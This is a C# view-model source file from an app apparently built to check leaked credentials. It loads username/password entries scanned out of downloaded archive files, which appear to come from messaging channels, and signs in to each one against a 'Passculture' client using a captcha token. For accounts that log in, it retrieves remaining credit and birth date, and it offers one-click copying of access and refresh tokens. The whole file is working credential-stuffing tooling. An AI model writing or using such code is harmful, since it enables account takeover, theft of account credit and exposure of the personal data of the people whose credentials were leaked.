using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using CommunityToolkit.Mvvm.ComponentModel;
using DataVortex.App.Services;
using DataVortex.Core.Abstractions;
using DataVortex.Core.Extraction;
using DataVortex.Core.Models;
using DataVortex.Core.Passculture;
using System.Threading.Tasks;
using CommunityToolkit.Mvvm.Input;

namespace DataVortex.App.ViewModels;

public sealed partial class AccountsViewModel : ObservableObject
{
    private readonly IStorageService _storage;
    private readonly IUiDispatcher _ui;

    private int _accountCount;
    public int AccountCount
    {
        get => _accountCount;
        set => SetProperty(ref _accountCount, value);
    }

    private readonly PasscultureClient _passClient;

    public AccountsViewModel(IStorageService storage, IUiDispatcher ui, PasscultureClient passClient)
    {
        _storage = storage;
        _ui = ui;
        _passClient = passClient;
        Refresh();
    }

    private void PopulateAccountsCollection(IEnumerable<FileRecord> records)
    {
        Accounts.Clear();
        var seen = new HashSet<string>();
        foreach (var r in records)
        {
            if (r.Credentials is null) continue;
            foreach (var c in r.Credentials)
            {
                // Do not show credentials that were tested and found invalid (status 400)
                if (c.Tested && c.TestSuccess == false && c.StatusCode == 400) continue;
                var key = $"{c.Username ?? ""}\u0001{c.Password ?? ""}\u0001{c.Url ?? ""}";
                if (seen.Contains(key)) continue;
                seen.Add(key);
                // Map CredentialEntry to lighter UI model if needed; add directly for now
                Accounts.Add(c);
            }
        }
        AccountCount = Accounts.Count;
    }

    private string _captchaToken = "";
    public string CaptchaToken { get => _captchaToken; set => SetProperty(ref _captchaToken, value); }

    private string _statusText = "";
    public string StatusText { get => _statusText; set => SetProperty(ref _statusText, value); }

    public ObservableCollection<CredentialEntry> Accounts { get; } = new();

    [RelayCommand]
    private void CopyAccessToken(CredentialEntry? entry)
    {
        if (entry is null || string.IsNullOrWhiteSpace(entry.AccessToken)) return;
        try { System.Windows.Clipboard.SetText(entry.AccessToken); StatusText = "Access token copied to clipboard."; } catch { }
    }

    [RelayCommand]
    private void CopyRefreshToken(CredentialEntry? entry)
    {
        if (entry is null || string.IsNullOrWhiteSpace(entry.RefreshToken)) return;
        try { System.Windows.Clipboard.SetText(entry.RefreshToken); StatusText = "Refresh token copied to clipboard."; } catch { }
    }

    [RelayCommand]
    private async Task TestAccountsAsync()
    {
        StatusText = "Testing accounts...";
        await Task.Run(async () =>
        {
            try
            {
                var records = _storage.LoadRecords();
                var set = new List<CredentialEntry>();
                foreach (var r in records)
                    if (r.Credentials is not null) set.AddRange(r.Credentials);

                // also scan extracted files
                foreach (var path in _storage.EnumerateExtractedFiles(null))
                {
                    try { set.AddRange(CredentialScanner.ScanFile(path)); } catch { }
                }

                if (set.Count == 0)
                {
                    StatusText = "No accounts to test.";
                    return;
                }

                var client = _passClient;

                var sb = new System.Text.StringBuilder();

                // Build mapping from credential key -> list of FileRecord references that contain it
                // key = username\u0001password\u0001url
                var recordsByKey = new Dictionary<string, List<FileRecord>>();

                foreach (var r in records)
                {
                    if (r.Credentials is null) continue;
                    foreach (var cred in r.Credentials)
                    {
                        var key = $"{cred.Username ?? ""}\u0001{cred.Password ?? ""}\u0001{cred.Url ?? ""}";
                        if (!recordsByKey.TryGetValue(key, out var list2))
                        {
                            list2 = new List<FileRecord>();
                            recordsByKey[key] = list2;
                        }
                        if (!list2.Contains(r)) list2.Add(r);
                    }
                }

                // For scanned credentials, ensure they are associated to a FileRecord (create minimal record if none)
                foreach (var path in _storage.EnumerateExtractedFiles(null))
                {
                    try
                    {
                        var found = CredentialScanner.ScanFile(path);
                        foreach (var c in found)
                        {
                            var key = $"{c.Username ?? ""}\u0001{c.Password ?? ""}\u0001{c.Url ?? ""}";
                            if (recordsByKey.ContainsKey(key)) continue;

                            // Try to find a record that lists this extracted file
                            var match = records.FirstOrDefault(r => r.ExtractedTextFiles?.Contains(path) == true);
                            if (match is not null)
                            {
                                match.Credentials ??= new List<CredentialEntry>();
                                match.Credentials.Add(c);
                                recordsByKey[key] = new List<FileRecord> { match };
                                // persist update
                                try { await _storage.SaveRecordAsync(match); } catch { }
                            }
                            else
                            {
                                // create minimal record to persist this credential
                                var nr = new FileRecord
                                {
                                    SourceChannelId = 0,
                                    SourceChannelTitle = "imported",
                                    MessageId = 0,
                                    OriginalFileName = Path.GetFileName(path),
                                    SizeBytes = 0,
                                    ReceivedUtc = DateTime.UtcNow,
                                    ProcessedUtc = DateTime.UtcNow,
                                    DownloadPath = path,
                                    Kind = ArchiveKind.PlainText,
                                    Status = ProcessingStatus.Completed,
                                    ExtractedTextFiles = new List<string> { path },
                                    Credentials = new List<CredentialEntry> { c }
                                };
                                try { await _storage.SaveRecordAsync(nr); }
                                catch { }
                                recordsByKey[key] = new List<FileRecord> { nr };
                            }
                        }
                    }
                    catch { }
                }

                // Now deduplicate keys to test
                var keysToTest = new List<string>();
                foreach (var kv in recordsByKey)
                {
                    var key = kv.Key;
                    var already = false;
                    foreach (var rec in kv.Value)
                    {
                        var matchCred = rec.Credentials?.FirstOrDefault(cr => $"{cr.Username ?? ""}\u0001{cr.Password ?? ""}\u0001{cr.Url ?? ""}" == key);
                        if (matchCred is not null && matchCred.Tested) { already = true; break; }
                    }
                    if (!already) keysToTest.Add(key);
                }

                foreach (var key in keysToTest)
                {
                    try
                    {
                        var parts = key.Split('\u0001');
                        var user = parts.Length > 0 ? parts[0] : "";
                        var pass = parts.Length > 1 ? parts[1] : "";
                        var url = parts.Length > 2 ? parts[2] : null;
                        var res = await client.SignInAsync(user, pass, CaptchaToken);
                        sb.AppendLine($"{user}: success={res.Success}, accountState={res.AccountState}, token={(res.AccessToken is null ? "no" : "yes")}");
                        if (res.Success && res.AccessToken is not null)
                        {
                            var me = await client.GetMeAsync(res.AccessToken);
                            sb.AppendLine($" - me: success={me.Success}, credit={me.DomainsCreditRemaining}, birth={me.BirthDate}");
                        }

                        // update all associated records
                        if (recordsByKey.TryGetValue(key, out var recs))
                        {
                            foreach (var rec in recs)
                            {
                                try
                                {
                                    rec.Credentials ??= new List<CredentialEntry>();
                                    var cr = rec.Credentials.FirstOrDefault(crd => $"{crd.Username ?? ""}\u0001{crd.Password ?? ""}\u0001{crd.Url ?? ""}" == key);
                                    if (cr is null)
                                    {
                                        cr = new CredentialEntry(url, user, pass, 0, Path.GetFileName(rec.ExtractedTextFiles.FirstOrDefault() ?? ""), Tested: true, TestSuccess: res.Success, TestMessage: res.Raw, TestedUtc: DateTime.UtcNow);
                                        rec.Credentials.Add(cr);
                                    }
                                    else
                                    {
                                        // update
                                        var idx = rec.Credentials.IndexOf(cr);
                                        var updated = cr with { Tested = true, TestSuccess = res.Success, TestMessage = res.Raw, TestedUtc = DateTime.UtcNow };
                                        rec.Credentials[idx] = updated;
                                    }
                                    await _storage.SaveRecordAsync(rec);
                                }
                                catch { }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine($"Error testing key {key}: {ex.Message}");
                    }
                }

                _ui.Post(() => StatusText = sb.ToString());
            }
            catch (Exception ex)
            {
                _ui.Post(() => StatusText = ex.Message);
            }
        });
    }

    public void Refresh()
    {
        _ui.Post(() =>
        {
            try
            {
                var records = _storage.LoadRecords();

                // Build a deduplicated set of credentials from saved records
                var set = new HashSet<string>();
                foreach (var r in records)
                {
                    if (r.Credentials is null) continue;
                    foreach (var c in r.Credentials)
                    {
                        var key = $"{c.Username ?? ""}\u0001{c.Password ?? ""}\u0001{c.Url ?? ""}";
                        set.Add(key);
                    }
                }

                // Also scan any already-extracted .txt files (in case metadata didn't include credentials)
                foreach (var path in _storage.EnumerateExtractedFiles(null))
                {
                    try
                    {
                        var found = CredentialScanner.ScanFile(path);
                        foreach (var c in found)
                        {
                            var key = $"{c.Username ?? ""}\u0001{c.Password ?? ""}\u0001{c.Url ?? ""}";
                            set.Add(key);
                        }
                    }
                    catch { }
                }

                AccountCount = set.Count;
                // populate Accounts collection for UI
                _ui.Post(() => PopulateAccountsCollection(records));
            }
            catch
            {
                AccountCount = 0;
            }
        });
    }
}
